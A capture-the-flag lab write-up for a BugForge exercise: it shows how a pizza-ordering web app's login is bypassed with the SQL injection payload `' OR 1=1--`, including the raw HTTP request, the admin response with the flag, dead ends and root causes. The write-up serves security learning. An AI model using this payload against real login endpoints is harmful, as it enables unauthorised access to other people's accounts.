# cheesy-002 - BugForge Lab Walkthrough

**URL:** https://lab-1781290801717-lkd98s.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** SQL Injection - Auth Bypass (Login)
**Flag:** `bug{kxw2f8xYWhnSvVnKUgPyyys352obaSsG}`

---

## Summary

Pizza ordering React SPA (Cheesy Does It) with an Express.js backend. The login endpoint passes the password field directly into a SQL query without sanitisation. Injecting `' OR 1=1--` into the password bypasses authentication and returns the first DB user (admin), leaking the flag in the success response.

## Tech Stack

- Frontend: React SPA (CRA, MUI), JWT in localStorage
- Backend: Express.js, SQLite
- Auth: JWT (HS256)

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/login` | None | Vulnerable - password field SQLi |
| `GET /api/admin/stats` | Admin JWT | Admin dashboard |

## Attack Chain

1. **POST /api/login** with SQLi payload in the password field:

```
POST /api/login HTTP/1.1
Host: lab-1781290801717-lkd98s.labs-app.bugforge.io
Content-Type: application/json

{"email":"admin@cheesy.com","password":"' OR 1=1--"}
```

Response includes admin JWT + flag:
```json
{"token":"eyJ...","user":{"id":1,"username":"admin","role":"admin"},"success":"Welcome back, admin! Flag: bug{kxw2f8xYWhnSvVnKUgPyyys352obaSsG}"}
```

## Discovery Notes

- Source map was exposed at `/static/js/main.db402bda.js.map`
- Source audit revealed `/api/login` calls, Register and Checkout components
- `' OR 1=1--` in the password field returned the first DB row (admin)

## Dead Ends

| Tried | Result |
|---|---|
| Mass assignment (`role:admin` on register) | Ignored by server |
| Business logic - amount:0 on `/api/payment/process` | Accepted, but order creation timed out via proxy |

## Root Causes

- Password value concatenated directly into SQL query (no parameterised queries)
- No input sanitisation or allowlist on the login endpoint
- Flag returned in the login success response body (should never be done)

## CWE / OWASP

- CWE-89: SQL Injection
- OWASP A03:2021 - Injection
